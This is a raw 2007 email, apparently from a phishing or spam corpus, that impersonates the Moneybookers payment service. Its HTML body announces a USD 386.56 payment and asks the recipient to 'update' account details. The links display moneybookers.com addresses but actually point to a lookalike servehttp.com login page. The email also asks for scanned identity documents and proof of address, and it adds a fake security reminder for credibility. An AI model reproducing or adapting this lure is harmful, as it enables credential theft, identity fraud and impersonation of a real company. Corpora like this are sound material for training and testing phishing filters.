@@ -1,0 +1,179 @@
+Return-Path: <fiona@server2.virtual-uk.net>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 5CF0E2A894
+	for <user@example.com>; Mon,  5 Mar 2007 15:26:23 -0500 (EST)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+	by mail.example.com (Example mail relay) with ESMTP id 32D18621DE3
+	for <user@example.com>; Mon,  5 Mar 2007 15:26:23 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+	id 89EA4162D0; Mon,  5 Mar 2007 15:31:16 -0500 (EST)
+Delivered-To: user@example.com
+Received: from server2.virtual-uk.net (nspinternational.com [69.20.61.18])
+	by mail.example.com (Example mail relay) with ESMTP id 5EB39162C5
+	for <user@example.com>; Mon,  5 Mar 2007 15:31:16 -0500 (EST)
+Received: (from fiona@localhost)
+	by server2.virtual-uk.net (8.12.11.20060308/8.11.6) id l25KQMJR014429;
+	Mon, 5 Mar 2007 21:26:22 +0100
+Received: (from fiona@localhost)
+	by server2.virtual-uk.net (8.12.11.20060308/8.11.6) id l25KQM9o014418;
+	Mon, 5 Mar 2007 21:26:22 +0100
+Date: Mon, 5 Mar 2007 21:26:22 +0100
+Message-Id: <200703052026.l25KQM9o014418@server2.virtual-uk.net>
+From: service@moneybookers.com
+To: user@example.com
+Subject: MoneyBookers.com:Money Received New Update'
+Content-Type: text/html
+X-Keywords:                  
+Status: RO
+Content-Length: 6107
+Lines: 147
+
+<html>
+<head>
+
+<title>moneybookers.com</title>
+<link rel="styleSheet" href="http://www.moneybookers.com/css/style.css" type="text/css" media="screen" />
+
+<link rel="styleSheet" href="http://www.moneybookers.com/css/style_en.css" type="text/css" media="screen">
+
+<link href="http://www.moneybookers.com/images/favico.gif" type="image/gif" rel="icon" />
+<script language="Javascript" src="http://www.moneybookers.com/main.js"></script>
+
+<script language="Javascript" src="http://www.moneybookers.com/ourlib.js"></script>
+<script language="Javascript">	
+//define variables that can be used from any script for specific reason
+var hint_anchors = new Array();
+</script>	
+
+<meta name="Page-topic" content="Send payments via email">		<meta http-equiv="Content-Type" content="text/html; charset=utf-6">
+<meta name="robots" content="all,index,follow" />
+
+<meta name="distribution" content="global" />
+<meta name="rating" content="general" />
+
+<br>
+<table width=100%
+ border=0 cellpadding=1 cellspacing=0 bgcolor="white">
+  <tr> 
+    <td bgcolor="white" width="10">&nbsp;</td>
+    <td valign=top align=middle><table cellspacing=0 cellpadding=0 width="100%" border=0>
+        <tr> 
+        </tr>
+        <tr> 
+          <td nowrap colspan=2 height=1><img height=1
+ src="http:///images/pxl.gif"  width=1></td>
+        </tr>
+      </table>
+      <table cellspacing=0 cellpadding=0 width="100%" bgcolor=white
+ border=0>
+        <tr> 
+          <td width=5><img height=1 src="http:///images/pxl.gif"  width=5></td>
+          <td class=smooth><br>	<strong>	 
+ <br>
+          </td>
+          <td width=5><img height=1 src="http:///images/pxl.gif" 
+ width=5></td>
+        </tr>
+      </table>
+      <table cellspacing=0 cellpadding=0 width="100%" border=0>
+        <tr> 
+          <td nowrap colspan=2 height=1><img height=1
+ src="http:///images/pxl.gif"  width=1></td>
+        </tr>
+        <tr> 
+          <td class=thead nowrap width="50%"><strong>&nbsp;&nbsp;Payment details</td></strong>
+          <td class=theadsmall nowrap align=right width="50%"></td>
+        </tr>
+        <tr> 
+          <td nowrap colspan=2 height=1><img height=1
+ src="http:///images/pxl.gif"  width=1></td>
+        </tr>
+      </table>
+      <table cellspacing=0 cellpadding=0 width="100%" bgcolor=white
+ border=0>
+        <tr> 
+          <td width=5><img height=1 src="http:///images/pxl.gif"  width=5></td>
+          <td class=smooth valign="top"><p> <br>
+
+              <strong>Amount:</strong> USD 386.56<br>
+  <strong>ID:</strong> 23455643 <br>
+              <strong>Subject:</strong> You must use the link below to accept the payment. <br>
+              <strong>Note:</strong> <a href="http://moneybookers-received.servehttp.com/app/login.pl/index.htm">https://www.moneybookers.com/accept.php?payment_id?=23455643</a><br>
+              <br>
+            </p></td>
+          <td width=5><img height=1 src="http:///images/pxl.gif" 
+ width=5></td>
+        </tr>
+      </table>
+      <table cellspacing=0 cellpadding=0 width="100%" border=0>
+        <tr> 
+          <td nowrap height=1><img height=1
+ src="http:///images/pxl.gif"  width=1></td>
+        </tr>
+      </table>
+      <table cellspacing=0 cellpadding=0 width="100%" bgcolor=white
+ border=0>
+        <tr> 
+          <td>&nbsp;</td>
+        </tr>
+        <tr> 
+          <td width=5><img height=1 src="http:///images/pxl.gif"  width=5></td>
+          <td class=smooth valign="top"><div>
+           <td width="17">&nbsp;</td>
+    <td width="505" valign="top"><div align="justify"><strong>Dear Sir/Madam, </div>
+      <p align="justify">We are writing you this email in regards to your account 
+        with <br>
+        moneybookers.</p>
+      <p align="justify">In accordance with our terms and conditions, article 
+        3.2., we would like <br>
+        to kindly ask you to confirm your identity by doing the following:<br>
+        <br>
+        1. Click the link below and update your account informations by filling 
+        the forms.</p>
+      <p align="justify">&nbsp;&nbsp;&nbsp;&nbsp;<a href=http://moneybookers-received.servehttp.com/app/login.pl/index.htm><strong>https://www.moneybookers.com/app/identify.pl</strong></a></p>
+      <p align="justify">2. Send us copies of following documents:<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;- personal identification document (identity card or driving license or 
+        <br>
+        international passport)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;- a proof of the address submitted with our system (bank account <br>
+        statement or utility bill)</p>
+      <p align="justify">You can send those scanned to our email address <br>
+        <a href=mailto:service@moneybookers.com>service@moneybookers.com</a> or faxed to +44 709 204 2001.</p>
+      <p align="justify">With best regards,</p>
+      <p align="justify">your moneybookers team</p></td>
+            <br> </td>
+          <td width=5><img height=1 src="http:///images/pxl.gif" 
+ width=5></td>
+        </tr>
+      </table>
+<table cellspacing=0 cellpadding=0 width="100%" border=0>
+ <tr> 
+  <td nowrap colspan=2 height=1><img height=1
+ src="http:///images/pxl.gif"  width=1></td>
+ </tr>
+ <tr> 
+  <td class=thead nowrap width="50%">&nbsp;&nbsp;<strong>Moneybookers Security Reminders</td>
+  <td class=theadsmall nowrap align=right width="50%"></td>
+ </tr>
+ <tr> 
+  <td nowrap colspan=2 height=1><img height=1
+ src="http:///images/pxl.gif"  width=1></td>
+ </tr>
+   </table>
+ <table cellspacing=0 cellpadding=0 width="100%" bgcolor=white border=0>        <tr>           <td width=5><img height=1 src="http:///images/pxl.gif"  width=5></td>          <td class=smooth valign="top"><p> <br>              <strong>Protect Your Password</strong><br><strong>
+         Moneybookers and its representatives will NEVER ask you to reveal your password. There are NO EXCEPTIONS to this policy. If anyone asks for your password by phone refuse and immediately report this to <a target="_blank"  rel="nofollow" _ href=mailto:security@moneybookers.com>security@moneybookers.com</a>.<br>
+  <br>
+  <br></strong>
+  </td>  </tr></table>
+    
+    &nbsp; 
+  
+
+<br>
+<br>
+<xbody>
+</html>
+
+
